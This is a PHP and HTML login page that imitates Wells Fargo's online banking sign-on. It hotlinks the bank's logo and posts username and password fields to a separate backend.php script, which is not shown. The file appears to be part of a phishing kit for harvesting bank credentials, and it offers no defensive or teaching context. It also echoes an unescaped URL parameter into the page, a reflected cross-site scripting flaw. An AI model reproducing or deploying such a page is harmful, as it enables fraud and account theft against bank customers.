<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
    <link rel="stylesheet" href="/bootstrap/css/bootstrap.css">
</head>
<body>
<?php
$error = $_GET['error']??0;
$msg = $_GET['msg']??null;
?>
<div class="container-fluid">
    <form method="post" action="backend.php">
        <div id="login">
            <div class="topheader"></div>
            <div class="middleheader">
                <p>Sign On to View Your Accounts</p>
                <p>Enter your username and password to securely view and manage your Wells Fargo accounts online.</p>
            </div>

            <?php
            if ($error){
            ?>
            <div class="myalert">
             <img src="https://4vector.com/i/free-vector-warning-sign-clip-art_116436_Warning_Sign_clip_art_medium.png">
                <span>
                    <?php echo $msg; ?>
                </span>
            </div>
            <?php
            }
            ?>

            <div class="loginform">
                <table>
                    <tr>
                        <td><input placeholder="Username" type="text" name="username"></td>
                        <td><input placeholder="password" type="password" name="password"></td>
                    </tr>
                    <tr>
                        <td colspan="2" class="td_save_username">
                            <input type="checkbox" name="save_login" value="1"> Save Username
                        </td>
                    </tr>

                    <tr>
                        <td colspan="2" class="td_links">
                            <a href="#">Forgot Password/Username?</a>  | <a href="#">Enroll Now</a>
                        </td>
                    </tr>

                    <tr>
                        <td colspan="2" class="td_buttons">
                            <button class="btn btn-dark" type="reset">RESET</button>
                            <button class="btn btn-danger" type="submit">LOGIN</button>
                        </td>
                    </tr>

                </table>
            </div>

        </div>
    </form>

</div>
<style>
    .myalert img{
        width: 20px;
    }
    .myalert{
        width: 70%;
        text-align: center;
        border-radius: 10px;
        height: 30px;
        background-color: #eec5c8;
        margin: 2px auto;
        font-size: 13px;
        font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
        padding-top: 3px;
        color: darkred;

    }
    .td_buttons{
        padding-top: 30px;
        text-align: center;
    }
    .td_links{
        font-size: 12px;
        text-align: left;
        padding-left: 24px;
        padding-top: 40px;
    }
    .td_save_username{
        text-align: left;
        padding-left: 24px;
        padding-top: 20px;
        font-size: 12px;
    }
    .loginform input{
        border: none;
        border-bottom: 1px solid black;
    }
    .loginform table{
        margin: auto;
        width: 70%;
    }
    .loginform{
        text-align: center;
    }
    .middleheader p:last-child{
        text-align: center;
        font-size: 11px;
    }
    .middleheader p:first-child{
        text-align: center;
        font-size: 21px;
        font-weight: bolder;
    }
    .middleheader{
        margin-top: 60px;
    }
    .topheader{
        width: 100%;
        height: 100px;
        background-image: url("https://connect.secure.wellsfargo.com/auth/static/images/WF_stagecoach_rgb_ylw_F1.svg");
        background-size: 100% 100%;
        background-repeat: no-repeat;
        background-color: #f1ebb9;
        text-align: center;
        font-size: 25px;
        font-family: "Arial Rounded MT Bold";
        font-weight: bolder;
        padding-top: 20px;
    }
    #login{
        width: 650px;
        height: 500px;
        margin: 70px auto;
        border: 1px double black;
        border-radius: 10px;
        padding: 5px;
        background-color: whitesmoke;
    }
    body{
        background-color: #4c2e00;
    }
</style>
</body>
</html>